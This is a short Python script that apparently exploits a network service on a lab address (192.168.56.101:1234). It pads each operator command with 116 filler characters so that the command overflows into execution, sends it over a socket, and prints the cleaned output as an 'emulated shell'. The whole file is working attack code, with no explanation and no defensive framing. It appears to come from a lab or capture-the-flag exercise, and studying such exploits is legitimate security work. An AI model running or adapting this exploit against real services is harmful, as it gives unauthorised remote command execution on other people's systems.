from os import system
from time import sleep
import socket
import select
from collections import deque

def get_cmd():
    global q
    nbChar = 116
    print("(emulated shell)$", end='')
    cmd = ""
    while cmd == "":
        cmd = input()

    q.append("a"*nbChar + cmd)
    #no error managment

def send():
    global q, maliciousString
    while not q:
        pass

    maliciousString = q.popleft()
    s.send(maliciousString.encode())


def main():
    global s, q, maliciousString
    nbChar = 116
    adress = ("192.168.56.101", 1234)
    
    omit = 2
    q = deque()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(adress)
    
    while True:
        a,_,_ = select.select([s],[],[])
        if a != []:
            ans = s.recv(2048).decode()
            if ans != '':
                if omit == 2:
                    get_cmd()
                    send()
                elif omit == 1:
                    res = ans.find(maliciousString)
                    ans = ans[res+len(maliciousString)+36:]

                if omit <= 1:
                    print(ans, end = '')
                omit -= 1
            else:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(adress)
                omit = 2

    s.close()

main()
